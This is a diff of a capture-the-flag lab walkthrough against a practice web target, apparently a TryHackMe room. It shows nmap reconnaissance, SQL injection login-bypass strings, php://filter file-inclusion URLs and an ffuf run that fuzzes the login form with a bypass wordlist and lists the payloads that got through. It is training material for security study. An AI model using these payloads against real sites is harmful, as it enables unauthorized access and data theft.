@@ -1,6 +1,6 @@
-# ip: 10.10.34.44
+# ip: 10.201.123.154
 
-nmap -Pn -oN namp.txt -sV -sC 10.10.34.44 --open
+nmap -Pn -oN namp.txt -sV -sC 10.201.123.154 --open
 
 # all port are opened... so we are gonna to check step by step known port 22, 80, 8080, 5432... etc
 
@@ -24,10 +24,10 @@ nmap -Pn -oN namp.txt -sV -sC 10.10.34.44 --open
 └─# cat namp.txt | grep 3306
 3306/tcp open mysql?
 
-http 10.10.34.44
+http 10.201.123.154
 
 ┌──(root㉿docker-desktop)-[/]
-└─# http 10.10.34.44
+└─# http 10.201.123.154
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
 Connection: Keep-Alive
@@ -60,7 +60,6 @@ Vary: Accept-Encoding
             <li><a href="#about">About Us</a></li>
             <li><a href="#contact">Contact</a></li>
             <li><a href="login.php">Login</a></li>
-            <!-- Added login link -->
           </ul>
         </nav>
       </div>
@@ -109,7 +108,7 @@ Vary: Accept-Encoding
 
 # info@thecheeseshop.com
 
-http 10.10.34.44/login.php
+http 10.201.123.154/login.php
 
 ```html
 <!DOCTYPE html>
@@ -141,4 +140,75 @@ http 10.10.34.44/login.php
 </html>
 ```
 
-# ffuf
+# curl login
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/6507c942-3c34-404e-8dd2-b3d599dac5f8/image.png)
+
+# sql inject
+
+' || 1=1;-- -
+' OR 'x'='x'#;
+
+username=%27+%7C%7C+1%3D1%3B--+-&password=1
+
+http://10.201.123.154/secret-script.php?file=supersecretadminpanel.html
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/0aea22c6-84fb-485f-a9e0-3aedd94d214f/image.png)
+
+# directory traversal
+
+http://10.201.123.154/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
+http://10.201.123.154/secret-script.php?file=php://filter/resource=users.html
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/f1b75c5b-17ef-432f-864f-be4badf39e18/image.png)
+
+http://10.201.123.154/secret-script.php
+
+# SQL injection
+
+┌──(root㉿docker-desktop)-[/]
+└─# ffuf -u http://cheesectf.thm/login.php -d 'username=FUZZ&password=asd' -w /usr/share/seclists/Fuzzing/login_bypass.txt
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+
+---
+
+:: Method : POST
+:: URL : http://cheesectf.thm/login.php
+:: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/login_bypass.txt
+:: Data : username=FUZZ&password=asd
+:: Follow redirects : false
+:: Calibration : false
+:: Timeout : 10
+:: Threads : 40
+:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+
+---
+
+admin)(&) [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 339ms]
+' or 1 or ' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 345ms]
+_)(|(_ [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 340ms]
+pwd) [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 347ms]
+' or '1'='1 [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 354ms]
+pwd)) [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 348ms]
+admin' or ' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 340ms]
+password [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 348ms]
+
+-                       [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 348ms]
+  pwd [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 345ms]
+  123456 [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 454ms]
+  ' or ''&' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 400ms]
+  ' or ''_' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 400ms]
+  ' ' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 400ms]
+  ' or ''^' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 400ms]
+  '_' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 400ms]
+  ' or ''-' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 400ms]
+
+# All success
